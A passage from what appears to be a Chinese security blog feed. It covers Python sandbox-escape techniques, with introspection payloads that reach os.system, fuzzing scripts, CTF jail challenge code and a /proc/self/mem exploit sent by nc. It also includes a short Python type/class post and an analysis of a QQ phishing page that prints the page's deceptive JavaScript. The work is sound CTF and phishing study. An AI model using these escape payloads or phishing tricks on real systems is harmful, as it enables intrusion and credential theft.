&#39;type&#39;&gt;</code></pre><p>2)我们从他的类向上追溯到他的基类，直至object根类</p><p>①多次使用<code>__base__</code> 或者 <code>__bases__</code></p><pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__base__&lt;type &#39;basestring&#39;&gt;&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__base__&lt;type &#39;object&#39;&gt;&gt;&gt;&gt; &#39;&#39;.__class__.__bases__[0]&lt;type &#39;basestring&#39;&gt;&gt;&gt;&gt; &#39;&#39;.__class__.__bases__[0].__bases__[0]&lt;type &#39;object&#39;&gt;&gt;&gt;&gt; &#39;&#39;.__class__.__bases__(&lt;type &#39;basestring&#39;&gt;,)&gt;&gt;&gt; &#39;&#39;.__class__.__bases__.__class__&lt;type &#39;tuple&#39;&gt;&gt;&gt;&gt; &#39;&#39;.__class__.__bases__.__class__.__bases__[0]&lt;type &#39;object&#39;&gt;</code></pre><p>②直接使用<code>__mro__</code></p><pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2]&lt;type &#39;object&#39;&gt;</code></pre><p>3）我们从根类object向下回溯，使用 <code>__subclasses__</code></p><pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2]&lt;type &#39;object&#39;&gt;&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__&lt;built-in method __subclasses__ of type object at 0x8f8740&gt;&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;]</code></pre><p>哇，这也太多了吧，我怎么知道我该选哪个？？<br>别怕，我python本就是用来写脚本的，写一个循环遍历一下岂不是简简单单？？</p><p>我这里就直接把bendawang 师傅文章中的代码拿过来</p><pre><code class="hljs">#!/usr/bin/env python# encoding: utf-8cnt=0for item in [].__class__.__base__.__subclasses__():    try:        if &#39;os&#39; in item.__init__.__globals__:            print cnt,item        cnt+=1    except:        print &quot;error&quot;,cnt,item        cnt+=1        continue</code></pre><p>这段代码的目的就是找到调用 os 模块的入口，当然我们只要把os 替换成sys 等其他模块也能得到对应的结果。</p><pre><code class="hljs">#!/usr/bin/env python# encoding: utf-8cnt=0for item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():    try:        cnt2=0        for i in item.__init__.__globals__:            if &#39;eval&#39; in item.__init__.__globals__[i]:                print cnt,item,cnt2,i            cnt2+=1        cnt+=1    except:        print &quot;error&quot;,cnt,item        cnt+=1        continue</code></pre><p>这第二个脚本相当于就是跑了两层</p><p>这两个脚本的思路非常的好，赶紧搬过来收藏一下，以后作为参考hhh</p><p><strong>4）简单的整理一下前辈们已经fuzz出来的一些结果：</strong></p><pre><code class="hljs">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&quot;ls&quot;)&#39;)&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></pre><h2 id="六、内存破坏突破python沙盒"><a href="#六、内存破坏突破python沙盒" class="headerlink" title="六、内存破坏突破python沙盒"></a>六、内存破坏突破python沙盒</h2><p>这个方法来源于 Plaid CTF 2014年的一道题<code>__nightmares__</code><br>这道题的出题思路并不是web的单纯的绕过，而是涉及到了内存的破坏与利用<br>附上题目代码：</p><pre><code class="hljs">#!/usr/bin/python -u&#39;&#39;&#39;You may wish to refer to solutions to the pCTF 2013 &quot;pyjail&quot; problem ifyou choose to attempt this problem, BUT IT WON&#39;T HELP HAHAHA.&#39;&#39;&#39;from imp import acquire_lockfrom threading import Threadfrom sys import modules, stdin, stdout# No more importing!x = Thread(target = acquire_lock, args = ())x.start()x.join()del xdel acquire_lockdel Thread# No more modules!for k, v in modules.iteritems():    if v == None: continue    if k == &#39;__main__&#39;: continue    v.__dict__.clear()del k, v__main__ = modules[&#39;__main__&#39;]modules.clear()del modules# No more anything!del __builtins__, __doc__, __file__, __name__, __package__print &gt;&gt; stdout, &quot;Get a shell. The flag is NOT in ./key, ./flag, etc.&quot;while 1:    exec &#39;print &gt;&gt; stdout, &#39; + stdin.readline() in &#123;&#39;stdout&#39;:stdout&#125;</code></pre><p>WP address :<a href="https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/">https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/</a></p><h2 id="七、一些简单的python-沙盒"><a href="#七、一些简单的python-沙盒" class="headerlink" title="七、一些简单的python 沙盒"></a>七、一些简单的python 沙盒</h2><p>下面列出一些python 的沙盒代码，给学习的人一些参考</p><h3 id="题目一、"><a href="#题目一、" class="headerlink" title="题目一、"></a>题目一、</h3><pre><code class="hljs">  ____                   |  _ \ _   _ _ __       | |_) | | | | &#39;_ \      |  _ &lt;| |_| | | | |     |_| \_\__,_|_| |_|                            Escape from the dark house built with python :)Try to getshell then find the flag!&gt;&gt;&gt;#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date    : 2018-04-09 23:30:58# @Author  : Xu (you@example.org)# @Link    : https://xuccc.github.io/# @Version : $Id$from sys import modulesfrom cpython import get_dictfrom types import FunctionTypemain  = modules[&#39;__main__&#39;].__dict__origin_builtins = main[&#39;__builtins__&#39;].__dict__def delete_type():    type_dict = get_dict(type)    del type_dict[&#39;__bases__&#39;]    del type_dict[&#39;__subclasses__&#39;]def delete_func_code():    func_dict = get_dict(FunctionType)    del func_dict[&#39;func_code&#39;]def safe_import(__import__,whiteList):    def importer(name,globals=&#123;&#125;,locals=&#123;&#125;,fromlist=[],level=-1):        if name in whiteList:            return __import__(name,globals,locals,fromlist,level)        else:            print &quot;HAHA,[%s]  has been banned~&quot; % name    return importerclass ReadOnly(dict):    &quot;&quot;&quot;docstring for ReadOnlu&quot;&quot;&quot;    def __delitem__(self,keys):        raise ValueError(&quot;:(&quot;)            def pop(self,key,default=None):        raise ValueError(&quot;:(&quot;)            def popitem(self):        raise ValueError(&quot;:(&quot;)            def setdefault(self,key,value):        raise ValueError(&quot;:(&quot;)            def __setitem__(self,key,value):        raise ValueError(&quot;:(&quot;)            def __setattr__(self, name, value):        raise ValueError(&quot;:(&quot;)    def update(self,dict,**kwargs):        raise ValueError(&quot;:(&quot;)        def builtins_clear():    whiteList = &quot;raw_input  SyntaxError   ValueError  NameError  Exception __import__&quot;.split(&quot; &quot;)    for mod in __builtins__.__dict__.keys():        if mod not in whiteList:            del __builtins__.__dict__[mod]def input_filter(string):    ban = &quot;exec eval pickle os subprocess input sys ls cat&quot;.split(&quot; &quot;)    for i in ban:        if i in string.lower():            print &quot;&#123;&#125; has been banned!&quot;.format(i)            return &quot;&quot;    return string# delete_type();del delete_typedelete_func_code();del delete_func_codebuiltins_clear();del builtins_clearwhiteMod = []origin_builtins[&#39;__import__&#39;] = safe_import(__import__,whiteMod)safe_builtins = ReadOnly(origin_builtins);del ReadOnlymain[&#39;__builtins__&#39;] = safe_builtins;del safe_builtinsdel get_dict,modules,origin_builtins,safe_import,whiteMod,main,FunctionTypedel __builtins__, __doc__, __file__, __name__, __package__print &quot;&quot;&quot;  ____                   |  _ \ _   _ _ __       | |_) | | | | &#39;_ \      |  _ &lt;| |_| | | | |     |_| \_\\__,_|_| |_|                            Escape from the dark house built with python :)Try to getshell then find the flag!&quot;&quot;&quot;while 1:    inp = raw_input(&#39;&gt;&gt;&gt;&#39;)    cmd = input_filter(inp)    try:        exec cmd     except NameError, e:        print &quot;wow something lose!We can\&#39;t find it !  D:&quot;    except SyntaxError,e:        print &quot;Noob! Synax Wrong! :(&quot;    except Exception,e:        print &quot;unknow error,try again  :&gt;&quot;&gt;&gt;&gt;Traceback (most recent call last):  File &quot;/home/ctf/sandbox.py&quot;, line 92, in &lt;module&gt;    inp = raw_input(&#39;&gt;&gt;&gt;&#39;)EOFError: EOF when reading a line</code></pre><p>补充：这道题就是最近的异常比赛的题目源码，我做题 下载了下来，出题者本来的意图应该就是让我们使用内存攻击的pwn 的手法，但是还是被我们web选手饶了过去<br>下面给出pwn的一种解法：</p><pre><code class="hljs"># look up the addressesobjdump -R python.out | grep -E &#39;fopen|system&#39; # copy 8 bytes from the system address to the fopen64 address, and get flagecho &quot;(lambda r, w: r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40](&#39;grep ciscn -r /home/ctf/&#39;)) (().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;,&#39;r&#39;), ().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;,&#39;w&#39;,0))&quot; | nc 117.78.43.163 31836</code></pre><p>接下来是web解（来源于梅子酒师傅）</p><pre><code class="hljs">s = &quot;func_global&quot;+&quot;s&quot;d = &quot;sy&quot;+&quot;s&quot;b = &quot;o&quot;+&quot;s&quot;c = &quot;l&quot;+&quot;s&quot;print(&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(s)[&#39;linecache&#39;].__dict__[d].modules[b].popen(c).read())</code></pre><h3 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h3><pre><code class="hljs">#!/usr/bin/env pythonfrom future import print_functionprint(&quot;Welcome to my Python sandbox! Enter commands below!&quot;)banned = [     &quot;import&quot;,    &quot;exec&quot;,    &quot;eval&quot;,    &quot;pickle&quot;,    &quot;os&quot;,    &quot;subprocess&quot;,    &quot;kevin sucks&quot;,    &quot;input&quot;,    &quot;banned&quot;,    &quot;cry sum more&quot;,    &quot;sys&quot;]targets = builtins.dict.keys() targets.remove(&#39;raw_input&#39;) targets.remove(&#39;print&#39;) for x in targets:     del builtins.dict[x]while 1:     print(&quot;&gt;&gt;&gt;&quot;, end=&#39; &#39;)    data = raw_input()    for no in banned:        if no.lower() in data.lower():            print(&quot;No bueno&quot;)            break    else: # this means nobreak        exec data</code></pre><h3 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h3><pre><code class="hljs">#!/usr/bin/env pythonfrom re import findalldef make_secure():    UNSAFE = [&#39;open&#39;,              &#39;file&#39;,              &#39;execfile&#39;,              &#39;compile&#39;,              &#39;reload&#39;,              &#39;__import__&#39;,              &#39;eval&#39;,              &#39;input&#39;]    for func in UNSAFE:        del __builtins__.__dict__[func]# Remove dangerous builtinsmake_secure()print &#39;Go Ahead, Expoit me &gt;;D&#39;while True:    try:        # Read user input until the first whitespace character        inp = findall(&#39;\S+&#39;, raw_input())[0]        a = None        # Set a to the result from executing the user input        exec &#39;a=&#39; + inp        print &#39;Return Value:&#39;, a    except Exception, e:    print &#39;Exception:&#39;, e</code></pre><p>参考链接：<br><a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p><p><a href="http://www.0aa.me/index.php/archives/123/">http://www.0aa.me/index.php/archives/123/</a></p><p><a href="https://xz.aliyun.com/t/52">https://xz.aliyun.com/t/52</a></p><p><a href="https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/">https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/</a></p><p><a href="https://blog.csdn.net/qq_35078631/article/details/78504415">https://blog.csdn.net/qq_35078631/article/details/78504415</a></p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全 沙盒逃逸 Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 的 type与class 之争</title>
    <link href="/2018/05/04/Python%20%E7%9A%84%20type%E4%B8%8Eclass%20%E4%B9%8B%E4%BA%89/"/>
    <url>/2018/05/04/Python%20%E7%9A%84%20type%E4%B8%8Eclass%20%E4%B9%8B%E4%BA%89/</url>
    
    <content type="html"><![CDATA[<p>我这里特别想一个困扰我多年的问题，type object class 这三个到底是个什么关系？？写这篇文章的时候我特地去好好学习了一下，下面分享我的一些体会</p><span id="more"></span><p>一、我需要再次强调python中一切皆对象<br>type(类型)是对象<br>class(类)是对象<br>object(对象)还是对象<br>都是对象！！</p><p>二、父与子 AND 类型与实例</p><p>1.父与子<br>父与子的关系只存在于类这个对象之间，也就是我们所说的父类和子类，子类继承于父类拥有父类的特征但也允许有自己的特征。</p><p>2.类型与实例<br>这个就比较特殊，类型就是我们所说的type ,实例就是object 但同时object又是所有类的超类凌驾于所有的类和对象之上，而type是一切类的类型，所有的类都是type的实例，当然也包括object。</p><p>下面我们来证明一下这个观点：<br>测试一：    </p><pre><code class="hljs">&gt;&gt;&gt; object             ----&gt;自己是object&lt;type &#39;object&#39;&gt;&gt;&gt;&gt; type(object)       ----&gt;object的类型是type，时type的一个实例&lt;type &#39;type&#39;&gt;&gt;&gt;&gt; object.__class__   ----&gt; __class__ 和 type() 效果相同&lt;type &#39;type&#39;&gt;&gt;&gt;&gt; object.__bases__   ----&gt; object 是所有类的父类，不存在基类()</code></pre><p>测试二：</p><pre><code class="hljs">&gt;&gt;&gt; type               ----&gt; 自己是 type&lt;type &#39;type&#39;&gt;&gt;&gt;&gt; type(type)         ----&gt; type 是一切类的类型，包括他自己&lt;type &#39;type&#39;&gt;&gt;&gt;&gt; type.__class__     ----&gt; __class__ 和 type()效果相同&lt;type &#39;type&#39;&gt;&gt;&gt;&gt; type.__bases__     ----&gt; type 的基类依然是object (&lt;type &#39;object&#39;&gt;,)</code></pre><p>三、类型和非类型<br>1.在python中类和类型已经不可分，我们可以将其统称为类对象，这一点我们其实已经可以从上面的<code>__class__</code>和 type() 效果相同中略知一二 </p><p>2.Python 中目前可分的就是类型和非类型，虽然他们都是对象，但是他们有着本质的区别就是，类型是可以被继承的，而非类型不能被继承。就比如： int 是一个类型 而 2 是这个类型的实例 虽然他们都是对象，但是2却没有被继承的能力，继承了也没有任何的意义</p><p>如何判断是否是类型？<br>如果一个对象的类型是 <code>&lt;class &#39;type&#39;&gt;</code> 那他就是类型了。</p><p>参考链接：<br><a href="https://www.cnblogs.com/busui/p/7283137.html?utm_source=itdadao&utm_medium=referral">https://www.cnblogs.com/busui/p/7283137.html?utm_source=itdadao&amp;utm_medium=referral</a></p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全 Python语法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从钓鱼样本到某大厂存储型XSS</title>
    <link href="/2018/04/29/%E4%BB%8E%E9%92%93%E9%B1%BC%E6%A0%B7%E6%9C%AC%E5%88%B0%E6%9F%90%E5%A4%A7%E5%8E%82%E5%AD%98%E5%82%A8%E5%9E%8BXSS/"/>
    <url>/2018/04/29/%E4%BB%8E%E9%92%93%E9%B1%BC%E6%A0%B7%E6%9C%AC%E5%88%B0%E6%9F%90%E5%A4%A7%E5%8E%82%E5%AD%98%E5%82%A8%E5%9E%8BXSS/</url>
    
    <content type="html"><![CDATA[<p>原文已首发在先知社区<br><a href="https://xz.aliyun.com/t/2322">https://xz.aliyun.com/t/2322</a></p><p>虽然网络环境渐渐变好，但是盗号行为依旧猖獗，除了一些知名厂商被脱库导致大量信息泄露之外，钓鱼依然是危害最大也是最有可能中招的欺骗手段，那么现在就带领大家看看我是如何从一份抓包保存的记录中一步步复现钓鱼者利用漏洞实现人脑缓冲区溢出，并最终成功挖到这个漏洞的。</p><span id="more"></span><h2 id="0X01-故事开始"><a href="#0X01-故事开始" class="headerlink" title="0X01 故事开始"></a>0X01 故事开始</h2><p>N年不联系的好友突然发消息给你，发的还是一个从来没见过的链接，十有八九是钓鱼，点进去，果不其然是一个空间的登录页面，由于当时我正在给某CTF出题，就匆忙用burpsuite抓取了我手机整个访问链接到登陆的过程，并把history保存成了文档，然后就弃之一边了。<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A51.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A52.png" alt="此处输入图片的描述"></p><h2 id="0X02-一个星期以后"><a href="#0X02-一个星期以后" class="headerlink" title="0X02 一个星期以后"></a>0X02 一个星期以后</h2><p>闲下来以后，又想起了那个神奇的网站，于是乎翻找聊天记录，点击链接，发现页面上赫然写着该作品已经下线。作品？？那个是钓鱼作品？后来一看域名发现是某大厂域名，仿佛明白了什么。大概是利用的这个页面的漏洞，得手后赶紧把自己的“作品”（哈哈，这里叫作品还挺贴切）下线了。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A53.png" alt="此处输入图片的描述"></p><h2 id="0X03-解密过程"><a href="#0X03-解密过程" class="headerlink" title="0X03 解密过程"></a>0X03 解密过程</h2><p>从history中找到了对恶意域名请求的响应如下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A527.png" alt="此处输入图片的描述"></p><p>可以看到history全部是经过base64编码的数据，我们来解码分析一下。</p><h3 id="一、使用JS动态替换页面"><a href="#一、使用JS动态替换页面" class="headerlink" title="一、使用JS动态替换页面"></a>一、使用JS动态替换页面</h3><p>一上来就直接用匿名函数动态替换了，只是替换的内容部分用URL编码了，我们解码一下<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ1.png" alt="此处输入图片的描述"></p><p>可以看到是一个html页面，但是依然是使用js动态写入的<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ2.png" alt="此处输入图片的描述"></p><p>并且还使用了三层加密&#x2F;编码，分别是BASE64、RC4 和URL，我是第一次在恶意代码中见到使用RC4这种加密方式的，有密码常识的都知道RC4属于流密码的一种，主要用在SSL和WEP中，存在安全缺陷，但是js是没有直接的函数能够解密rc4的，需要自己写解密的代码，在我成功解密之后看到的是下面图片中的代码。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ3.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ4_new.png" alt="此处输入图片的描述"></p><p>这里有两段JS 一段 HTML 和一段 jQuery的AJAX，我们一个一个分析</p><p><strong>1.JS代码</strong><br>1）第一段JS采用的是最常见的 “packer&#x2F;d” 加密（或许不叫这个名字）但是由于开头总有packer&#x2F;packed 这几个字母我就姑且这样称呼。我将其拖到控制台简单的修改一下（就是去掉eval）运行得到另一段JS（真的是没完没了啊….在玩俄罗斯套娃吗？？？）</p><p>下面先来分析这段JS的作用（hacker特地把它加了密，一定有什么不得了的东西）:<br>部分代码如下：</p><pre><code class="hljs">var doc = $(document);var _touches_point1 = 0;var _touches_point2 = 0;addEventListener(&quot;touchstart&quot;,function(a)&#123;_touches_point1=a.touches[0].pageY&#125;);addEventListener(&quot;touchmove&quot;,function(a)&#123;_touches_point2=a.touches[0].pageY;if(doc.scrollTop()&lt;=0&amp;&amp;_touches_point1&lt;_touches_point2)&#123;a.preventDefault();if($(&quot;#_domain_display&quot;).length&lt;=0)&#123;$(&quot;body&quot;).prepend(&#39;&lt;div id=&quot;_domain_display&quot; style=&quot;text-align:center;background-color:#bebdc2;color:#65696c;height:0px;padding-top:15px;line-height:26px;font-size:12px;overflow:hidden;&quot;&gt;&lt;p&gt;网页由 &#39;+&#39;ui.ptlogin2.qq.com&#39;+&#39; 提供&lt;/p&gt;&lt;p&gt;QQ浏览器X5内核提供技术支持&lt;/p&gt;&lt;/div&gt;&#39;)&#125;$(&quot;#_domain_display&quot;).height((_touches_point2-_touches_point1))&#125;&#125;);addEventListener(&quot;touchend&quot;,function(a)&#123;$(&quot;#_domain_display&quot;).slideUp(&quot;normal&quot;,function()&#123;$(&quot;#_domain_display&quot;).remove()&#125;)&#125;);</code></pre><p>这一部分代码的主要的作用就是伪造手机端下拉页面之后页面上方空白处显示的网站支持信息，他为了不暴露真实的网址就做了这样一个掩护</p><pre><code class="hljs">&lt;p&gt;网页由 &#39;+&#39;ui.ptlogin2.qq.com&#39;+&#39; 提供&lt;/p&gt;&lt;p&gt;QQ浏览器X5内核提供技术支持&lt;/p&gt;</code></pre><p>虽然这个网页原始的地址也不是他自己的evil网站，而是那个大厂的网站，但是为了谨慎起见，他还是做了隐藏（失败的是，在我做本地测试的时候发现这个隐藏只会对苹果手机有用，安卓手机页面下拉之后会出现两个支持信息（如下图所示，上面是安卓手机下面是苹果手机）分了两层而且颜色不一致，完全暴露了页面的来源（虽然页面的来源是大厂的域名）（不过我也由此猜测攻击者使用的就是苹果手机，并没有考虑到安卓手机的问题）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A526.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A57.png" alt="此处输入图片的描述"><br>接下来的代码是这样的：</p><pre><code class="hljs">var system=&#123;win:false,mac:false,xll:false&#125;;var p=navigator.platform;system.win=p.indexOf(&quot;Win&quot;)==0;system.mac=p.indexOf(&quot;Mac&quot;)==0;system.x11=(p==&quot;X11&quot;)||(p.indexOf(&quot;Linux&quot;)==0);if(system.win||system.mac||system.xll)&#123;window.location.href=&quot;http://qzone.qq.com&quot;&#125;if(navigator.userAgent.indexOf(&#39;QQ/&#39;)&gt;0)&#123;&#125;else&#123;window.location.href=&#39;http://qzone.qq.com&#39;&#125;var province=remote_ip_info.province;var city=remote_ip_info.city;document.getElementById(&quot;ip&quot;).value=province+city;</code></pre><p>可以清楚地看到，攻击者使用JS判段了运行代码的平台以及点击这个链接的起始位置也就是UA，甚至还获取了用户的地理位置信息。</p><p>我这里特别要说明的是：</p><p>请注意这个代码有一个很迷的地方就是 X11和Xll，X11应该是正确的写法，和Linux差不多的，但是由于安卓手机是Linux 内核，经过我的测试会返回Linux字样而不是Android，于是攻击者改了X11为Xll来适应安卓平台（这难道也是一种混淆？？）当然这里面没有iphone（测试如下图所示）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A58.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A59.png" alt="此处输入图片的描述"></p><p>这段代码的流程大致是这样：<br>（1）首先判断点击这个链接的平台，如果是PC那么直接跳转到真正的QQ空间登录,如果是移动端那么进行下一步判断<br>（2）判断点击这个链接的地点是不是在QQ内部，如果不是就会直接跳转到真的QQ空间登录（因为他知道你不在QQ里面没有session之类的就没法在输入密码之后成功登进去，就露馅了）<br>（3）当然你现在十有八九就是在QQ内部点击的这个链接，那么恭喜你中了他早已设置好的圈套（脚本什么都不做，你就乖乖在假的登录框输入密码吧）</p><p>2）第二段JS主要就是验证登陆的逻辑，判段你的QQ号和密码是不是随便输入的，简单的做了一个格式上的验证</p><pre><code class="hljs">  $(&quot;#go&quot;).on(&#39;click&#39;,    function() &#123;    var $this = $(this);    err = false;    var p = $(&quot;#p&quot;).val();    var u = $(&quot;#u&quot;).val();    u == &#39;&#39; &amp;&amp; error(&#39;您还没有输入帐号！&#39;);    if (err) return false;    p == &#39;&#39; &amp;&amp; error(&quot;您还没有输入密码！&quot;);    if (err) return false;    /^[1-9][0-9]&#123;5,9&#125;$/.test(u) || error(&#39;请输入正确的帐号！&#39;);    if (err) return false;    var len = p.length; (len &lt; 6 || len &gt; 16) &amp;&amp; error(&#39;您输入的帐号或密码不正确，请重新输入。&#39;);    if (err) &#123;      $(&quot;#p&quot;).val(&#39;&#39;);      return false;    &#125;    </code></pre><p><strong>2.HTML代码</strong><br>html代码的内容就是他精心构造的登录界面，代码可以说写的是非常的丑了，各种眼花缭乱的html属性参数，不过并不影响我们阅读，其中还是有一个细节的地方就是，钓鱼页面写的是”请输入您的密码”，而真正的腾讯说的是”请输入你的密码”（攻击者的底气不够强硬啊~~)<br>放上截图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ5.png" alt="此处输入图片的描述"></p><p><strong>3.AJAX代码</strong><br>这段AJAX可是精华所在，核心中的核心代码，他会把你的提交直接发到攻击者的服务器，然后跳转到QQ空间登录页面，获取你密码之后再让你真正登陆进去。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ6_new.png" alt="此处输入图片的描述"></p><h3 id="二、添加了微信浏览器title的设置"><a href="#二、添加了微信浏览器title的设置" class="headerlink" title="二、添加了微信浏览器title的设置"></a>二、添加了微信浏览器title的设置</h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A520.png" alt="此处输入图片的描述"></p><p>经过我的搜索这些检测平台以及伪造的脚本全部是网上搜集来的…..以下是某乎截图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A521.png" alt="此处输入图片的描述"></p><h3 id="三、动态在页面添加解密节点"><a href="#三、动态在页面添加解密节点" class="headerlink" 